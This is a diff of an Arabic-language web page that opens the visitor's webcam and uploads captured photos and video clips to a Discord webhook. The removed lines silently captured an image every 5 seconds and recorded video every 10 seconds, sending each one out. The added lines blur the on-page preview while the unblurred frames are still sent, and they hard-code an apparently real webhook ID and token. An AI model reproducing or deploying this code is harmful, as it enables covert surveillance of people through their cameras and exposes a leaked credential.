@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التقاط صورة وفيديو تلقائي</title>
+    <title>التقاط صورة وفيديو</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -19,6 +19,7 @@
             max-width: 600px;
             border: 1px solid #ddd;
             margin-bottom: 20px;
+            filter: blur(10px); /* إضافة فلتر تشويش على الفيديو */
         }
         canvas {
             display: none;
@@ -47,7 +48,7 @@
 </head>
 <body>
 
-    <h1>التقاط صورة وفيديو تلقائي</h1>
+    <h1>التقاط صورة وفيديو عند الطلب</h1>
     
     <!-- عرض الذكرى بشكل تلقائي -->
     <div>
@@ -64,6 +65,9 @@
 
     <canvas id="canvas" width="640" height="480"></canvas>
 
+    <button id="captureButton">التقاط صورة</button>
+    <button id="recordButton">بدء تسجيل الفيديو</button>
+    
     <script>
         const video = document.getElementById('video');
         const message = document.getElementById('message');
@@ -73,43 +77,47 @@
         let recorder;
         let chunks = [];
 
-        // بدء تشغيل الفيديو من كاميرا الويب
+        // بدء تشغيل الفيديو من كاميرا الويب عند تحميل الصفحة
         async function startVideo() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                // بدء التقاط الصور والفيديو بعد 5 ثواني
-                setInterval(captureImage, 5000); // التقاط صورة كل 5 ثواني
-                setInterval(startRecording, 10000); // بدء تسجيل فيديو كل 10 ثواني
             } catch (err) {
                 message.textContent = "لم يتمكن المتصفح من الوصول إلى الكاميرا.";
                 console.error("خطأ في الوصول إلى الكاميرا: ", err);
             }
         }
 
-        // التقاط صورة بشكل تلقائي
+        // التقاط صورة عند الضغط على زر "التقاط صورة"
+        document.getElementById('captureButton').addEventListener('click', captureImage);
+
         function captureImage() {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
             sendImageToWebhook(imageData);
         }
 
-        // بدء تسجيل الفيديو بشكل تلقائي
+        // بدء تسجيل الفيديو عند الضغط على زر "بدء تسجيل الفيديو"
+        document.getElementById('recordButton').addEventListener('click', startRecording);
+
         function startRecording() {
             chunks = [];
             recorder = new MediaRecorder(stream);
             recorder.ondataavailable = (e) => chunks.push(e.data);
             recorder.onstop = () => sendVideoToWebhook();
             recorder.start();
+            message.textContent = "يتم تسجيل الفيديو...";
+
+            // التوقف عن التسجيل بعد 5 ثواني
             setTimeout(() => {
                 recorder.stop();
-            }, 5000); // توقف عن التسجيل بعد 5 ثواني
+            }, 5000);
         }
 
         // إرسال الصورة إلى الـ Webhook
         async function sendImageToWebhook(imageData) {
             try {
-                const response = await fetch('https://discord.com/api/webhooks/your-webhook-id/your-webhook-token', { // استبدل بـ Webhook الخاص بك
+                const response = await fetch('https://discord.com/api/webhooks/1362295538137043034/kVkadWuQygKz3igA3HVip8gs6ZA5met8p1SBlfszjSEQ_y1M58cvofS7U-C23Mv3Tzao', { // Webhook الخاص بك
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -135,7 +143,7 @@
             formData.append('video', blob, 'video.webm');
 
             try {
-                const response = await fetch('https://discord.com/api/webhooks/your-webhook-id/your-webhook-token', { // استبدل بـ Webhook الخاص بك
+                const response = await fetch('https://discord.com/api/webhooks/1362295538137043034/kVkadWuQygKz3igA3HVip8gs6ZA5met8p1SBlfszjSEQ_y1M58cvofS7U-C23Mv3Tzao', { // Webhook الخاص بك
                     method: 'POST',
                     body: formData
                 });
